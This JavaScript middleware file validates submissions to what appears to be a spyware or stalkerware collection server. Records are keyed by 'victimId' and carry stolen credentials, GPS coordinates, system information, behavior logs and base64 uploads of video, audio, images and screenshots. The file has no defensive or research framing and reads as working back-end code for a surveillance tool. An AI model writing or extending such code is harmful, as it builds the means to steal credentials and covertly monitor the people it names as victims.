here// Input validation and sanitization
const validateVictimData = (req, res, next) => {
    const { victimId, dataType, payload } = req.body;
    
    // Validate required fields
    if (!victimId || !dataType) {
        return res.status(400).json({
            error: 'Missing required fields',
            required: ['victimId', 'dataType']
        });
    }
    
    // Validate victim ID format
    if (!/^v[a-z0-9]{10,15}$/.test(victimId)) {
        return res.status(400).json({
            error: 'Invalid victim ID format'
        });
    }
    
    // Validate data type
    const allowedDataTypes = [
        'system_info',
        'location', 
        'media',
        'credentials',
        'behavior',
        'progress_update',
        'error',
        'scan_complete'
    ];
    
    if (!allowedDataTypes.includes(dataType)) {
        return res.status(400).json({
            error: 'Invalid data type',
            allowed: allowedDataTypes
        });
    }
    
    // Validate payload based on data type
    if (!validatePayload(dataType, payload)) {
        return res.status(400).json({
            error: 'Invalid payload for data type'
        });
    }
    
    next();
};

const validateMediaUpload = (req, res, next) => {
    const { victimId, mediaType, data } = req.body;
    
    if (!victimId || !mediaType || !data) {
        return res.status(400).json({
            error: 'Missing required fields for media upload'
        });
    }
    
    // Validate media type
    const allowedMediaTypes = ['video', 'audio', 'image', 'screenshot'];
    if (!allowedMediaTypes.includes(mediaType)) {
        return res.status(400).json({
            error: 'Invalid media type',
            allowed: allowedMediaTypes
        });
    }
    
    // Validate base64 data
    if (!isValidBase64(data)) {
        return res.status(400).json({
            error: 'Invalid base64 data'
        });
    }
    
    // Check data size limits (10MB max)
    const dataSize = Buffer.from(data, 'base64').length;
    if (dataSize > 10 * 1024 * 1024) {
        return res.status(413).json({
            error: 'Media file too large',
            maxSize: '10MB'
        });
    }
    
    next();
};

// Helper functions
function validatePayload(dataType, payload) {
    switch(dataType) {
        case 'location':
            return payload.coordinates && 
                   typeof payload.coordinates.latitude === 'number' &&
                   typeof payload.coordinates.longitude === 'number';
        
        case 'system_info':
            return payload.userAgent && payload.platform;
            
        case 'credentials':
            return payload.username || payload.email;
            
        default:
            return typeof payload === 'object' && payload !== null;
    }
}

function isValidBase64(str) {
    try {
        return Buffer.from(str, 'base64').toString('base64') === str;
    } catch (err) {
        return false;
    }
}

module.exports = {
    validateVictimData,
    validateMediaUpload
};
